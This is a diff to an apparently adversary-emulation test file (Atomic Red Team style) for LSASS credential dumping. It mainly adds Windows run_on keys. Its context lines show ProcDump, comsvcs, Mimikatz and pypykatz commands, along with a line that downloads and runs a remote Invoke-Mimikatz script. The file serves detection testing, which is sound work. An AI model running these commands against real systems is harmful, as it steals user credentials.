@@ -1,5 +1,5 @@
 attack_technique: T1003.001
-display_name: "OS Credential Dumping: LSASS Memory"
+display_name: 'OS Credential Dumping: LSASS Memory'
 atomic_tests:
 - name: Dump LSASS.exe Memory using ProcDump
   auto_generated_guid: 0be2230c-9ab3-4ac2-8826-3199b9a0ebf8
@@ -41,6 +41,8 @@ atomic_tests:
       del "#{output_file}" >nul 2> nul
     name: command_prompt
     elevation_required: true
+  run_on:
+  - windows
 - name: Dump LSASS.exe Memory using comsvcs.dll
   auto_generated_guid: 2536dee2-12fb-459a-8c37-971844fa73be
   description: |
@@ -56,6 +58,8 @@ atomic_tests:
       Remove-Item $env:TEMP\lsass-comsvcs.dmp -ErrorAction Ignore
     name: powershell
     elevation_required: true
+  run_on:
+  - windows
 - name: Dump LSASS.exe Memory using direct system calls and API unhooking
   auto_generated_guid: 7ae7102c-a099-45c8-b985-4c7a2d05790d
   description: |
@@ -90,6 +94,8 @@ atomic_tests:
     name: command_prompt
     elevation_required: true
 
+  run_on:
+  - windows
 - name: Dump LSASS.exe Memory using NanoDump
   auto_generated_guid: dddd4aca-bbed-46f0-984d-e4c5971c51ea
   description: |
@@ -118,6 +124,8 @@ atomic_tests:
     name: command_prompt
     elevation_required: true
 
+  run_on:
+  - windows
 - name: Dump LSASS.exe Memory using Windows Task Manager
   auto_generated_guid: dea6c349-f1c6-44f3-87a1-1ed33a59a607
   description: |
@@ -138,6 +146,8 @@ atomic_tests:
       3. Dump lsass.exe memory:
         Right-click on lsass.exe in Task Manager. Select "Create Dump File". The following dialog will show you the path to the saved file.
     name: manual
+  run_on:
+  - windows
 - name: Offline Credential Theft With Mimikatz
   auto_generated_guid: 453acf13-1dbd-47d7-b28a-172ce9228023
   description: |
@@ -178,6 +188,8 @@ atomic_tests:
       "#{mimikatz_exe}" "sekurlsa::minidump #{input_file}" "sekurlsa::logonpasswords full" exit
     name: command_prompt
     elevation_required: true
+  run_on:
+  - windows
 - name: LSASS read with pypykatz
   auto_generated_guid: c37bc535-5c62-4195-9cc3-0517673171d8
   description: |
@@ -222,13 +234,15 @@ atomic_tests:
       pypykatz live lsa
     name: command_prompt
     elevation_required: true
+  run_on:
+  - windows
 - name: Dump LSASS.exe Memory using Out-Minidump.ps1
   auto_generated_guid: 6502c8f0-b775-4dbd-9193-1298f56b6781
   description: |
     The memory of lsass.exe is often dumped for offline credential theft attacks. This test leverages a pure
     powershell implementation that leverages the MiniDumpWriteDump Win32 API call.
     Upon successful execution, you should see the following file created $env:TEMP\lsass_*.dmp.
-    
+
     Author of Out-Minidump: Matthew Graeber (@mattifestation)
   supported_platforms:
   - windows
@@ -243,6 +257,8 @@ atomic_tests:
       Remove-Item $env:TEMP\lsass_*.dmp -ErrorAction Ignore
     name: powershell
     elevation_required: true
+  run_on:
+  - windows
 - name: Create Mini Dump of LSASS.exe using ProcDump
   auto_generated_guid: 7cede33f-0acd-44ef-9774-15511300b24b
   description: |
@@ -282,6 +298,8 @@ atomic_tests:
       del "#{output_file}" >nul 2> nul
     name: command_prompt
     elevation_required: true
+  run_on:
+  - windows
 - name: Powershell Mimikatz
   auto_generated_guid: 66fb0bc1-3c3f-47e9-a298-550ecfefacbc
   description: |
@@ -295,12 +313,15 @@ atomic_tests:
     remote_script:
       description: URL to a remote Mimikatz script that dumps credentials
       type: url
-      default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1
+      default: 
+        https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1
   executor:
     command: |
       IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds
     name: powershell
     elevation_required: true
+  run_on:
+  - windows
 - name: Dump LSASS with createdump.exe from .Net v5
   auto_generated_guid: 9d0072c8-7cca-45c4-bd14-f852cfa35cf0
   description: |
@@ -326,6 +347,8 @@ atomic_tests:
       Remove-Item $env:Temp\dotnet-lsass.dmp -ErrorAction Ignore
     name: powershell
     elevation_required: true
+  run_on:
+  - windows
 - name: Dump LSASS.exe using imported Microsoft DLLs
   auto_generated_guid: 86fc3f40-237f-4701-b155-81c01c48d697
   description: |
@@ -360,6 +383,8 @@ atomic_tests:
       Remove-Item #{output_file} -ErrorAction Ignore
     name: powershell
     elevation_required: true
+  run_on:
+  - windows
 - name: Dump LSASS.exe using lolbin rdrleakdiag.exe
   auto_generated_guid: 47a539d1-61b9-4364-bf49-a68bc2a95ef0
   description: |
@@ -388,6 +413,8 @@ atomic_tests:
       Remove-Item $env:TEMP\t1003.001-13-rdrleakdiag -Recurse -Force -ErrorAction Ignore
     name: powershell
     elevation_required: true
+  run_on:
+  - windows
 - name: Dump LSASS.exe Memory through Silent Process Exit
   auto_generated_guid: eb5adf16-b601-4926-bca7-dad22adffb37
   description: |
@@ -427,3 +454,5 @@ atomic_tests:
       rmdir "#{output_folder}" /s /q >nul 2> nul
     name: command_prompt
     elevation_required: true
+  run_on:
+  - windows
